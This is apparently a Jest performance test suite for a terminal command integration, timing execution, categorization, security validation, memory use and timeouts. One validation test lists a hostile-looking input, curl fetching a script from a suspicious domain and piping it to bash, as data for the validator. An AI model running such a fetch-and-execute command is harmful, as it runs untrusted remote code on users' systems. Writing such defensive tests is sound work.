import { TerminalCommandIntegration, IntegrationConfig } from '../../src/TerminalCommandIntegration';
import { CommandCategorizer } from '../../src/command/CommandCategorizer';
import { SecurityValidator } from '../../src/security/SecurityValidator';

describe('Performance Tests', () => {
  let integration: TerminalCommandIntegration;
  let categorizer: CommandCategorizer;
  let validator: SecurityValidator;

  const performanceConfig: IntegrationConfig = {
    requireConfirmation: false,
    enableSandbox: false,
    securityThreshold: 70,
    executionTimeout: 10000,
    maxConcurrentExecutions: 10
  };

  beforeEach(() => {
    integration = new TerminalCommandIntegration(performanceConfig);
    categorizer = new CommandCategorizer();
    validator = new SecurityValidator();
  });

  afterEach(() => {
    // Clean up active executions
    const activeExecutions = integration.getActiveExecutions();
    activeExecutions.forEach(id => integration.terminateExecution(id));
  });

  describe('Command Execution Performance', () => {
    test('should execute simple commands quickly (<100ms)', async () => {
      const startTime = Date.now();
      
      await integration.executeCommand('echo', ['performance test']);
      
      const endTime = Date.now();
      const duration = endTime - startTime;
      
      expect(duration).toBeLessThan(100);
    });

    test('should handle multiple concurrent executions efficiently', async () => {
      const startTime = Date.now();
      
      const promises = Array(5).fill(0).map((_, i) => 
        integration.executeCommand('echo', [`concurrent test ${i}`])
      );
      
      const results = await Promise.all(promises);
      
      const endTime = Date.now();
      const duration = endTime - startTime;
      
      expect(results.length).toBe(5);
      results.forEach((result, i) => {
        expect(result.stdout.trim()).toBe(`concurrent test ${i}`);
        expect(result.exitCode).toBe(0);
      });
      
      // Should complete all 5 commands in less than 1 second
      expect(duration).toBeLessThan(1000);
    });

    test('should maintain consistent performance under load', async () => {
      const iterations = 20;
      const durations: number[] = [];
      
      for (let i = 0; i < iterations; i++) {
        const startTime = Date.now();
        await integration.executeCommand('echo', [`load test ${i}`]);
        const endTime = Date.now();
        
        durations.push(endTime - startTime);
      }
      
      const averageDuration = durations.reduce((a, b) => a + b, 0) / durations.length;
      const maxDuration = Math.max(...durations);
      const minDuration = Math.min(...durations);
      
      expect(averageDuration).toBeLessThan(50);
      expect(maxDuration - minDuration).toBeLessThan(100); // Consistent performance
    });

    test('should scale with batch operations', async () => {
      const batchSizes = [1, 3, 5];
      const performanceResults: { size: number; duration: number; throughput: number }[] = [];
      
      for (const size of batchSizes) {
        const commands = Array(size).fill(0).map((_, i) => ({
          command: 'echo',
          args: [`batch test ${i}`]
        }));
        
        const startTime = Date.now();
        const results = await integration.executeCommandBatch(commands);
        const endTime = Date.now();
        
        const duration = endTime - startTime;
        const throughput = size / (duration / 1000); // commands per second
        
        performanceResults.push({ size, duration, throughput });
        
        expect(results.length).toBe(size);
      }
      
      // Throughput should increase with batch size (up to a point)
      expect(performanceResults[2].throughput).toBeGreaterThan(performanceResults[0].throughput);
    });
  });

  describe('Analysis Performance', () => {
    test('should categorize commands quickly (<10ms)', () => {
      const testCommands = [
        ['ls', ['-la']],
        ['git', ['status']],
        ['npm', ['install', 'express']],
        ['sudo', ['systemctl', 'restart', 'nginx']],
        ['curl', ['https://api.github.com/user']]
      ];
      
      testCommands.forEach(([command, args]) => {
        const startTime = Date.now();
        
        const analysis = categorizer.analyzeCommand(command, args);
        
        const endTime = Date.now();
        const duration = endTime - startTime;
        
        expect(duration).toBeLessThan(10);
        expect(analysis.category).toBeDefined();
        expect(analysis.confidence).toBeGreaterThan(0);
      });
    });

    test('should validate security quickly (<50ms)', () => {
      const testCommands = [
        ['echo', ['hello world']],
        ['find', ['.', '-name', '*.js', '-type', 'f']],
        ['sudo', ['rm', '-rf', '/tmp/test']],
        ['curl', ['http://suspicious.domain.com/script.sh', '|', 'bash']],
        ['git', ['clone', 'https://github.com/user/repo.git']]
      ];
      
      testCommands.forEach(([command, args]) => {
        const analysis = categorizer.analyzeCommand(command, args);
        
        const startTime = Date.now();
        
        const result = validator.validateCommand(command, args, analysis);
        
        const endTime = Date.now();
        const duration = endTime - startTime;
        
        expect(duration).toBeLessThan(50);
        expect(result.score).toBeGreaterThanOrEqual(0);
        expect(result.score).toBeLessThanOrEqual(100);
        expect(result.checks.length).toBeGreaterThan(0);
      });
    });

    test('should handle complex commands efficiently', () => {
      const complexCommands = [
        'find /home/user -type f -name "*.log" -mtime +30 -exec gzip {} \\; -exec mv {}.gz /archive/ \\;',
        'docker run -it --rm -v $(pwd):/workspace -w /workspace node:18-alpine npm test',
        'git log --graph --pretty=format:"%h -%d %s (%cr) <%an>" --abbrev-commit --since="2 weeks ago"',
        'rsync -avz --exclude="node_modules" --exclude=".git" /source/ user@server:/destination/'
      ];
      
      complexCommands.forEach(cmd => {
        const [command, ...args] = cmd.split(' ');
        
        const startTime = Date.now();
        
        const analysis = categorizer.analyzeCommand(command, args);
        const result = validator.validateCommand(command, args, analysis);
        
        const endTime = Date.now();
        const duration = endTime - startTime;
        
        expect(duration).toBeLessThan(100);
        expect(analysis.category).toBeDefined();
        expect(result.score).toBeGreaterThanOrEqual(0);
      });
    });
  });

  describe('Memory Performance', () => {
    test('should not leak memory with repeated executions', async () => {
      const initialMemory = process.memoryUsage().heapUsed;
      
      // Execute many commands
      for (let i = 0; i < 100; i++) {
        await integration.executeCommand('echo', [`memory test ${i}`]);
        
        // Trigger garbage collection every 10 commands
        if (i % 10 === 0 && global.gc) {
          global.gc();
        }
      }
      
      const finalMemory = process.memoryUsage().heapUsed;
      const memoryIncrease = finalMemory - initialMemory;
      
      // Memory increase should be reasonable (less than 50MB)
      expect(memoryIncrease).toBeLessThan(50 * 1024 * 1024);
    });

    test('should manage execution history efficiently', async () => {
      const initialHistoryLength = integration.getExecutionHistory().length;
      
      // Execute commands and measure history growth
      for (let i = 0; i < 50; i++) {
        await integration.executeCommand('echo', [`history test ${i}`]);
      }
      
      const finalHistoryLength = integration.getExecutionHistory().length;
      const historyGrowth = finalHistoryLength - initialHistoryLength;
      
      expect(historyGrowth).toBe(50);
      
      // Check that each history entry is reasonable in size
      const history = integration.getExecutionHistory();
      const lastExecution = history[history.length - 1];
      
      expect(lastExecution.stdout.length).toBeLessThan(1000);
      expect(lastExecution.stderr.length).toBeLessThan(1000);
    });
  });

  describe('Throughput Benchmarks', () => {
    test('should achieve target throughput for command categorization', () => {
      const startTime = Date.now();
      const iterations = 1000;
      
      for (let i = 0; i < iterations; i++) {
        categorizer.analyzeCommand('ls', ['-la']);
      }
      
      const endTime = Date.now();
      const duration = endTime - startTime;
      const throughput = iterations / (duration / 1000);
      
      // Should categorize at least 100 commands per second
      expect(throughput).toBeGreaterThan(100);
    });

    test('should achieve target throughput for security validation', () => {
      const startTime = Date.now();
      const iterations = 500;
      
      for (let i = 0; i < iterations; i++) {
        const analysis = categorizer.analyzeCommand('echo', ['test']);
        validator.validateCommand('echo', ['test'], analysis);
      }
      
      const endTime = Date.now();
      const duration = endTime - startTime;
      const throughput = iterations / (duration / 1000);
      
      // Should validate at least 50 commands per second
      expect(throughput).toBeGreaterThan(50);
    });

    test('should maintain performance with varying command complexity', () => {
      const commands = [
        // Simple commands
        ...Array(10).fill(['echo', ['hello']]),
        // Medium complexity
        ...Array(10).fill(['find', ['.', '-name', '*.js']]),
        // Complex commands
        ...Array(10).fill(['git', ['log', '--oneline', '--graph']])
      ];
      
      const startTime = Date.now();
      
      commands.forEach(([command, args]) => {
        const analysis = categorizer.analyzeCommand(command, args);
        validator.validateCommand(command, args, analysis);
      });
      
      const endTime = Date.now();
      const duration = endTime - startTime;
      const throughput = commands.length / (duration / 1000);
      
      // Should maintain reasonable throughput even with mixed complexity
      expect(throughput).toBeGreaterThan(20);
    });
  });

  describe('Resource Efficiency', () => {
    test('should terminate long-running commands efficiently', async () => {
      const startTime = Date.now();
      
      // Start a long-running command
      const executionPromise = integration.executeCommand('sleep', ['5']);
      
      // Wait a bit then terminate
      setTimeout(() => {
        const activeExecutions = integration.getActiveExecutions();
        expect(activeExecutions.length).toBe(1);
        
        const terminated = integration.terminateExecution(activeExecutions[0]);
        expect(terminated).toBe(true);
      }, 100);
      
      try {
        await executionPromise;
      } catch (error) {
        // Expected to be terminated
      }
      
      const endTime = Date.now();
      const duration = endTime - startTime;
      
      // Should terminate quickly, not wait for the full 5 seconds
      expect(duration).toBeLessThan(1000);
    });

    test('should handle timeout efficiently', async () => {
      const shortTimeoutIntegration = new TerminalCommandIntegration({
        ...performanceConfig,
        executionTimeout: 200
      });
      
      const startTime = Date.now();
      
      try {
        await shortTimeoutIntegration.executeCommand('sleep', ['1']);
      } catch (error) {
        expect(error.message).toContain('timeout');
      }
      
      const endTime = Date.now();
      const duration = endTime - startTime;
      
      // Should timeout close to the specified timeout value
      expect(duration).toBeGreaterThan(180);
      expect(duration).toBeLessThan(300);
    });
  });

  describe('Performance Regression Prevention', () => {
    test('should maintain baseline performance metrics', async () => {
      const baselineMetrics = {
        simpleCommandExecution: 100, // ms
        commandCategorization: 10,   // ms
        securityValidation: 50,      // ms
        concurrentExecutions: 1000   // ms for 5 commands
      };
      
      // Test simple command execution
      const execStart = Date.now();
      await integration.executeCommand('echo', ['baseline test']);
      const execDuration = Date.now() - execStart;
      
      expect(execDuration).toBeLessThan(baselineMetrics.simpleCommandExecution);
      
      // Test categorization
      const catStart = Date.now();
      categorizer.analyzeCommand('git', ['status']);
      const catDuration = Date.now() - catStart;
      
      expect(catDuration).toBeLessThan(baselineMetrics.commandCategorization);
      
      // Test security validation
      const secStart = Date.now();
      const analysis = categorizer.analyzeCommand('ls', ['-la']);
      validator.validateCommand('ls', ['-la'], analysis);
      const secDuration = Date.now() - secStart;
      
      expect(secDuration).toBeLessThan(baselineMetrics.securityValidation);
      
      // Test concurrent executions
      const concStart = Date.now();
      const promises = Array(5).fill(0).map((_, i) => 
        integration.executeCommand('echo', [`concurrent ${i}`])
      );
      await Promise.all(promises);
      const concDuration = Date.now() - concStart;
      
      expect(concDuration).toBeLessThan(baselineMetrics.concurrentExecutions);
    });

    test('should generate performance report', async () => {
      const performanceReport = {
        testTimestamp: new Date().toISOString(),
        metrics: {
          commandExecutionLatency: 0,
          categorizationThroughput: 0,
          securityValidationLatency: 0,
          concurrentExecutionEfficiency: 0,
          memoryUsageEfficiency: 0
        }
      };
      
      // Measure command execution latency
      const execStart = Date.now();
      await integration.executeCommand('echo', ['performance report']);
      performanceReport.metrics.commandExecutionLatency = Date.now() - execStart;
      
      // Measure categorization throughput
      const catStart = Date.now();
      for (let i = 0; i < 100; i++) {
        categorizer.analyzeCommand('ls', ['-la']);
      }
      const catDuration = Date.now() - catStart;
      performanceReport.metrics.categorizationThroughput = 100 / (catDuration / 1000);
      
      // Measure security validation latency
      const secStart = Date.now();
      const analysis = categorizer.analyzeCommand('git', ['commit']);
      validator.validateCommand('git', ['commit'], analysis);
      performanceReport.metrics.securityValidationLatency = Date.now() - secStart;
      
      // All metrics should be within acceptable ranges
      expect(performanceReport.metrics.commandExecutionLatency).toBeLessThan(100);
      expect(performanceReport.metrics.categorizationThroughput).toBeGreaterThan(50);
      expect(performanceReport.metrics.securityValidationLatency).toBeLessThan(50);
      
      // Log the report for analysis
      console.log('Performance Report:', JSON.stringify(performanceReport, null, 2));
    });
  });
});
